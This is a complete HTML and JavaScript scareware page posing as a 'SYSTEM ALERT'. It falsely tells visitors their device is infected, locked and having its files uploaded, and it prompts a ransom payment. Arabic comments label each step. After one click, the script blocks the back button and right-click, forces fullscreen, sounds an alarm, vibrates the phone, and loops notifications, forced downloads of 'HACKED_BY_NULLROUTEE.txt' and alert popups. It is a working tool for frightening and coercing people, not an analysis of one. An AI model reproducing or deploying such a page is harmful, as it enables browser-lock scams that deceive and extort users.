<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>⚠️ SYSTEM ALERT ⚠️</title>
<style>
  body {
    margin: 0; background: #000; color: #ff0000; font-family: monospace;
    height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center;
    text-align: center; overflow: hidden; user-select: none;
    animation: flash 1s infinite alternate;
  }
  @keyframes flash { from { background: #000; } to { background: #1a0000; } }
  h1 { font-size: 40px; margin: 0 0 20px; text-transform: uppercase; text-shadow: 0 0 10px red; }
  p { font-size: 18px; margin: 10px 0; max-width: 600px; line-height: 1.5; }
  .skull { font-size: 100px; margin-bottom: 20px; animation: pulse 0.5s infinite alternate; }
  @keyframes pulse { from { transform: scale(1); } to { transform: scale(1.1); } }
  .countdown { font-size: 30px; font-weight: bold; color: #fff; margin-top: 30px; }
  #start-btn { margin-top: 40px; padding: 15px 30px; font-size: 20px; background: #ff0000; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; animation: pulse 1s infinite; }
</style>
</head>
<body>

  <div class="skull">💀</div>
  <h1>CRITICAL WARNING</h1>
  <p>Your device has been locked and infected with a dangerous trojan.</p>
  <p>All your personal files, photos, and passwords are being uploaded to our servers.</p>
  <p>Click the button below to initiate the ransom payment.</p>
  
  <!-- زر لبدء الرعب (لازم يضغطه عشان المتصفح يسمح بالاشعارات والاهتزاز) -->
  <button id="start-btn">INITIATE SYSTEM SCAN</button>
  
  <div class="countdown" id="timer" style="display:none;">Data exfiltration in: 10</div>

<script>
  // قفل زر الرجوع
  history.pushState(null, null, location.href);
  window.onpopstate = function () { history.go(1); };

  // منع النقر بالزر الأيمن
  document.addEventListener('contextmenu', event => event.preventDefault());

  let started = false;
  document.getElementById('start-btn').addEventListener('click', async () => {
    if (started) return;
    started = true;
    document.getElementById('start-btn').style.display = 'none';
    document.getElementById('timer').style.display = 'block';

    // 1. طلب الشاشة الكاملة
    if (document.documentElement.requestFullscreen) {
      document.documentElement.requestFullscreen().catch(e => {});
    }

    // 2. صوت الإنذار
    try {
      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      osc.type = 'sawtooth';
      osc.frequency.value = 800;
      gain.gain.value = 0.1;
      osc.connect(gain);
      gain.connect(audioCtx.destination);
      osc.start();
      setInterval(() => {
        osc.frequency.value = osc.frequency.value === 800 ? 400 : 800;
      }, 300);
    } catch(e) {}

    // 3. اهتزاز الجوال (أندرويد)
    if (navigator.vibrate) {
      setInterval(() => { navigator.vibrate([1000, 200, 1000, 200, 2000]); }, 3000);
    }

    // 4. إشعارات مزعجة
    if ("Notification" in window) {
      let perm = await Notification.requestPermission();
      if (perm === "granted") {
        setInterval(() => {
          new Notification("⚠️ SYSTEM HACKED", {
            body: "NullRoutee owns your device. Data is being uploaded...",
            icon: "https://cdn-icons-png.flaticon.com/512/564/564619.png"
          });
        }, 2000);
      }
    }

    // 5. تحميل ملفات قسرية كل 5 ثواني
    setInterval(() => {
      const a = document.createElement('a');
      const blob = new Blob(["YOU HAVE BEEN HACKED BY NULLROUTEE.\n\nYour IP has been logged.\nAll your data has been exfiltrated.\n\nGood luck."], {type: "text/plain"});
      a.href = URL.createObjectURL(blob);
      a.download = "HACKED_BY_NULLROUTEE.txt";
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    }, 5000);

    // 6. بوب أب لا نهائي
    setInterval(() => {
      alert("⚠️ WARNING: YOUR SYSTEM IS COMPROMISED ⚠️\n\nClose this tab if you dare...");
    }, 4000);

    // 7. العداد التنازلي
    let timeLeft = 10;
    const timerEl = document.getElementById('timer');
    setInterval(() => {
      if (timeLeft > 0) {
        timeLeft--;
        timerEl.textContent = `Data exfiltration in: ${timeLeft}`;
      } else {
        timerEl.textContent = "UPLOAD COMPLETE. DEVICE LOCKED.";
        timerEl.style.color = "#ff0000";
      }
    }, 1000);
  });
</script>
</body>
</html>
